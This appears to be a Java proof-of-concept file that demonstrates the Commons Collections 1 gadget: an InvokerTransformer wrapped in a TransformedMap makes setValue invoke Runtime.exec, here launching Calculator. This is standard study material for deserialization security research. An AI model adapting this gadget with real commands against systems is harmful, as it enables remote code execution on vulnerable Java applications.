package com.example.cc1;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;
public class setValueExec {
    public static void main(String[] args) {
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"});
        HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
        hashMap.put("key", "value");
        Map<Object, Object> decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);
        for (Map.Entry entry:decorateMap.entrySet()){
            entry.setValue(runtime);
        }
    }
}
